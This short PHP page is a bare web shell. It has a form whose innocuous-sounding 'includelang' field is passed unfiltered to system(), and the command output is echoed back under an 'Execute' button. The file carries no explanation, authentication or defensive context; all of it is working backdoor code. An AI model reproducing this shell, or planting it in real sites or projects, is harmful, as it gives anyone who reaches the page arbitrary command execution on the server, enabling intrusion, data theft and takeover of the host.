<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="includelang" autofocus id="includelang" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['includelang']))
    {
        system($_GET['includelang']);
    }
?>
</pre>
</body>
</html>